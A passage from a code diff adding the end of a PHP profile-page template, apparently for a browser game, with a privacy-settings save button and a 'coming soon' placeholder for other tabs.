+                                                <button type="submit" name="save_privacy" class="btn"
+                                                    style="padding: 4px 10px;"><?= __('screens.profile.save_privacy') ?></button>
+                                            </div>
+                                        </div>
+                                    </form>
+                                <?php endif; ?>
+
+                            </div>
+                        <?php else: ?>
+                            <!-- Other Tabs Placeholder -->
+                            <div
+                                style="background-color: #fceec4; padding: 50px; border: 1px solid #c1a264; margin-top: 5px; text-align: center;">
+                                <h3 style="color: #8c5f0d;"><?= __('screens.profile.tab_label') ?> '<?= htmlspecialchars($tabs[$current_tab]) ?>'</h3>
+                                <p style="color: #5d2f09;"><?= __('screens.profile.coming_soon_placeholder') ?></p>
+                                <img src="graphic/unit/unit_snob.png" style="opacity: 0.7; margin-top: 20px;">
+                            </div>
+                        <?php endif; ?>
+
+                    </td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+</table>
